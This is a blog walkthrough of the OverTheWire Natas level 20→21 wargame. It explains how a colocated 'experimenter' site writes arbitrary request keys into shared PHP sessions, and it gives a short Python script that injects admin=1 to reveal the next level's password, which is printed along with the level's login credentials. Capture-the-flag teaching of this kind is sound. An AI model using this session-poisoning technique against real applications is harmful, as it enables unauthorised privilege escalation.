---
layout: post-with-comments
title: "OverTheWire Natas Level 20 → 21 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-20-to-21/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, session, cookie, php, python]
description: "A step by step tutorial for OverTheWire Natas Level 20 → 21!!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-19-to-20/' | relative_url }}">← Previous: Level 19 → 20</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas21.html" target="_blank" rel="noopener">
      Official (Level 21) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-21-to-22/' | relative_url }}">
      Next: Level 21 → 22 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas21.natas.labs.overthewire.org](http://natas21.natas.labs.overthewire.org)  
Credentials: **natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH**

```bash
# Using curl (optional):
curl -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH 
  http://natas21.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-20-to-21/homepage.jpg' | relative_url }})

---

## Task

This level has **two colocated sites**:

1. **Main site** (`natas21.natas.labs.overthewire.org`)
   → checks if your session has `admin=1` to show the password.

2. **Experimenter site** (`natas21-experimenter.natas.labs.overthewire.org`)
   → lets you write arbitrary session keys into the same session storage.

We’ll exploit the experimenter to insert `admin=1` into the session, then reuse that cookie on the main site.

---

## A little bit of Theory

From the experimenter source:

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

⚠️ Any key/value pair we pass is written to the session.
If we send `admin=1`, our session now has the correct flag.

Meanwhile, the main site checks:

```php
if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
   // print credentials
}
```

So the trick is:
**Forge a session with `admin=1` on the experimenter → reuse it on the main site.**

---

## Solution

Instead of Burp, let’s automate with Python 🚀:

```python
import requests

URL_MAIN = "http://natas21.natas.labs.overthewire.org/"
URL_EXP = "http://natas21-experimenter.natas.labs.overthewire.org/"
AUTH = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")

# Start a session so cookies persist
s = requests.Session()
s.auth = AUTH

# Step 1: Forge admin session on the experimenter page
s.get(URL_EXP, params={"submit": "", "admin": "1"})

# Step 2: Reuse the same cookie on the main site
r = s.get(URL_MAIN)
print(r.text)
```

Running this script prints the HTML response from the main site — including the credentials for the next level 🎉.

![python-output]({{ '/assets/images/natas/level-20-to-21/python-output.jpg' | relative_url }})

---

## Password

```
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

---

## Troubleshooting

* Still a regular user? → Ensure you call the **experimenter** with `?submit&admin=1` before requesting the main site.
* Session not carried over? → Make sure to use the same `requests.Session()` so cookies persist.
* Expired? → Just rerun the script; it will forge a fresh session.

---

**Nice work 🎉** You chained two colocated apps: one to **set arbitrary session values**, the other to **trust them blindly**. That gave you the credentials for **natas22**.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

